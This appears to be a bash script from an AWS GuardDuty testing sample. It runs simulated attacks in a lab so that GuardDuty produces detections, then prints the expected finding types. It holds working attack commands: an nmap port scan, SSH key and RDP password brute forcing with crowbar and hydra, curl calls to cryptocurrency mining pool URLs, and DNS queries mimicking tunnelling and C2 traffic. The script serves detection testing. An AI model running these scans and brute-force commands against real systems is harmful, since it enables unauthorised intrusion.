#Copyright 2017 Amazon.com, Inc. or its affiliates. All Rights Reserved.
#  
#  Licensed under the Apache License, Version 2.0 (the "License").
#  You may not use this file except in compliance with the License.
#  A copy of the License is located at
#  
#      http://www.apache.org/licenses/LICENSE-2.0
#  
#  or in the "license" file accompanying this file. This file is distributed 
#  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either 
#  express or implied. See the License for the specific language governing 
#  permissions and limitations under the License.

#!/bin/bash

# load IP addresses created by templates
source localIps.sh

# simulate external recon
#echo 'External port probe on a temporarily unprotected port'

# 1 - simulate internal recon and attempted lateral movement
echo
echo '***********************************************************************'
echo '* Test #1 - Internal port scanning                                    *'
echo '* This simulates internal reconaissance by an internal actor or an   *'
echo '* external actor after an initial compromise. This is considered a    *'
echo '* low priority finding for GuardDuty because its not a clear indicator*'
echo '* of malicious intent on its own.                                     *'
echo '***********************************************************************'
echo
sudo nmap -sT $BASIC_LINUX_TARGET
echo
echo '-----------------------------------------------------------------------'
echo
# 2 - ssh brute force with list of keys found on web
echo '***********************************************************************'
echo '* Test #2 - SSH Brute Force with Compromised Keys                     *'
echo '* This simulates an SSH brute force attack on an SSH port that we    *'
echo '* can access from this instance. It uses (phony) compromised keys in  *'
echo '* many subsequent attempts to see if one works. This is a common      *'
echo '* techique where the bad actors will harvest keys from the web in     *'
echo '* places like source code repositories where people accidentally leave*'
echo '* keys and credentials (This attempt will not actually succeed in     *'
echo '* obtaining access to the target linux instance in this subnet)       *'
echo '***********************************************************************'
echo
for j in `seq 1 20`; do sudo ./crowbar/crowbar.py -b sshkey -s $BASIC_LINUX_TARGET/32 -U users -k ./compromised_keys; done
echo
echo '-----------------------------------------------------------------------'
echo
# 3 - rdp brute force with known user and list of passwords found on web
echo '***********************************************************************'
echo '* Test #3 - RDP Brute Force with Password List                        *'
echo '* This simulates an RDP brute force attack on the internal RDP port  *'
echo '* of the windows server that we installed in the environment.  It uses*'
echo '* a list of common passwords that can be found on the web. This test  *'
echo '* will trigger a detection, but will fail to get into the target      *'
echo '* windows instance.                                                   *'
echo '***********************************************************************'
echo
echo 'Sending 250 password attempts at the windows server...'
hydra  -f -L /home/ec2-user/users -P ./passwords/password_list.txt rdp://$BASIC_WINDOWS_TARGET
echo
echo '-----------------------------------------------------------------------'
echo
# 4 - CryptoCurrency Activity
echo '***********************************************************************'
echo '* Test #4 - CryptoCurrency Mining Activity                            *'
echo '* This simulates interaction with a cryptocurrency mining pool which *'
echo '* can be an indication of an instance compromise. In this case, we are*'
echo '* only interacting with the URL of the pool, but not downloading      *'
echo '* any files. This will trigger a threat intel based detection.        *'
echo '***********************************************************************'
echo
echo "Calling bitcoin wallets to download mining toolkits"
curl -s http://pool.minergate.com/dkjdjkjdlsajdkljalsskajdksakjdksajkllalkdjsalkjdsalkjdlkasj  > /dev/null &
curl -s http://xmr.pool.minergate.com/dhdhjkhdjkhdjkhajkhdjskahhjkhjkahdsjkakjasdhkjahdjk  > /dev/null &
echo
echo '-----------------------------------------------------------------------'
echo
# 5 - DNS Exfiltation 
echo '***********************************************************************'
echo '* Test #5 - DNS Exfiltration                                          *'
echo '* A common exfiltration technique is to tunnel data out over DNS      *'
echo '* to a fake domain.  Its an effective technique because most hosts    *'
echo '* have outbound DNS ports open.  This test wont exfiltrate any data,  *'
echo '* but it will generate enough unusual DNS activity to trigger the     *'
echo '* detection.                                                          *'
echo '***********************************************************************'
echo
echo "Calling large numbers of large domains to simulate tunneling via DNS" 
dig -f ./domains/queries.txt > /dev/null &
echo
# 6 - Backdoor:EC2/C&CActivity.B!DNS
echo '***********************************************************************'
echo '* Test #6 - Fake domain to prove that GuardDuty is working            *'
echo '* This is a permanent fake domain that customers can use to prove that*'
echo '* GuardDuty is working.  Calling this domain will always generate the *'
echo '* Backdoor:EC2/C&CActivity.B!DNS finding type                         *'
echo '***********************************************************************'
echo
echo "Calling a well known fake domain that is used to generate a known finding"
dig GuardDutyC2ActivityB.com any
echo
echo '*****************************************************************************************************'
echo 'Expected GuardDuty Findings'
echo
echo 'Test 1: Internal Port Scanning'
echo 'Expected Finding: EC2 Instance ' $RED_TEAM_INSTANCE ' is performing outbound port scans against remote host.' $BASIC_LINUX_TARGET
echo 'Finding Type: Recon:EC2/Portscan'
echo 
echo 'Test 2: SSH Brute Force with Compromised Keys'
echo 'Expecting two findings - one for the outbound and one for the inbound detection'
echo 'Outbound: ' $RED_TEAM_INSTANCE ' is performing SSH brute force attacks against ' $BASIC_LINUX_TARGET
echo 'Inbound: ' $RED_TEAM_IP ' is performing SSH brute force attacks against ' $BASIC_LINUX_INSTANCE
echo 'Finding Type: UnauthorizedAccess:EC2/SSHBruteForce'
echo
echo 'Test 3: RDP Brute Force with Password List'
echo 'Expecting two findings - one for the outbound and one for the inbound detection'
echo 'Outbound: ' $RED_TEAM_INSTANCE ' is performing RDP brute force attacks against ' $BASIC_WINDOWS_TARGET
echo 'Inbound: ' $RED_TEAM_IP ' is performing RDP brute force attacks against ' $BASIC_WINDOWS_INSTANCE
echo 'Finding Type : UnauthorizedAccess:EC2/RDPBruteForce'
echo
echo 'Test 4: Cryptocurrency Activity'
echo 'Expected Finding: EC2 Instance ' $RED_TEAM_INSTANCE ' is querying a domain name that is associated with bitcoin activity'
echo 'Finding Type : CryptoCurrency:EC2/BitcoinTool.B!DNS'
echo
echo 'Test 5: DNS Exfiltration'
echo 'Expected Finding: EC2 instance ' $RED_TEAM_INSTANCE ' is attempting to query domain names that resemble exfiltrated data'
echo 'Finding Type : Backdoor:EC2/DNSDataExfiltration'
echo
echo 'Test 6: C&C Activity'
echo 'Expected Finding: EC2 instance ' $RED_TEAM_INSTANCE ' is querying a domain name associated with a known Command & Control server. '
echo 'Finding Type : Backdoor:EC2/C&CActivity.B!DNS'
echo
